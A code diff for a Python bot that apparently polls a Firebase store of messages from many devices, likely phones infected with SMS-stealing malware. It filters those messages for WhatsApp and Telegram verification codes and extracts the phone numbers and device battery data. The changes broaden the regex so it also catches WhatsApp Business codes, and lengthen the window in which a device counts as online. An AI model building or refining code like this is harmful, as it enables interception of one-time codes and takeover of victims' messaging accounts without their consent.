@@ -48,8 +48,9 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                 detected_service = fbu.extract_service_name(text, sender)
                 text_lower = text.lower()
                 
+                # 🚨 STRICT FILTER: WhatsApp / Telegram / Business
                 if service_filter == "whatsapp":
-                    if "whatsapp" not in text_lower and not re.search(r'code:\s*\d{3}-\d{3}', text):
+                    if "whatsapp" not in text_lower and not re.search(r'code[:\s]+\d{3}-\d{3}', text_lower):
                         continue
                     detected_service = "WhatsApp"
                 elif service_filter == "telegram":
@@ -121,8 +122,7 @@ async def whatsapp_scanner(bot):
                     
                     for dev_id, c in clients.items():
                         if not isinstance(c, dict): continue
-                        # Only save if online
-                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
+                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000)
                         
                         if is_online:
                             msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
@@ -134,7 +134,8 @@ async def whatsapp_scanner(bot):
                             latest_id = 0
                             for m in msgs:
                                 txt = (m.get("message") or "").lower()
-                                if "whatsapp" in txt or re.search(r'code:\s*\d{3}-\d{3}', txt):
+                                # 🚨 WhatsApp aur WhatsApp Business dono catch karega
+                                if "whatsapp" in txt or re.search(r'code[:\s]+\d{3}-\d{3}', txt):
                                     has_ws = True
                                     mid = int(m.get("id", 0))
                                     if mid > latest_id: latest_id = mid
@@ -143,7 +144,7 @@ async def whatsapp_scanner(bot):
                                 best_nums = fbu.extract_best_numbers(c, msgs)
                                 if best_nums:
                                     num = best_nums[0][0]
-                                    # 🚨 REAL DATA SAVE
+                                    # 🚨 REAL DATA: Battery & Health
                                     real_battery = str(c.get("battery", "0")).replace("%", "")
                                     real_health = fbu.calculate_health(msgs)
                                     
@@ -163,7 +164,6 @@ async def whatsapp_scanner(bot):
             log.error(f"WA Scanner error: {e}")
         await asyncio.sleep(60)
 
-# Backup scanner same rahega...
 async def backup_scanner(bot):
     log.info("Backup Scanner Started...")
     while True:
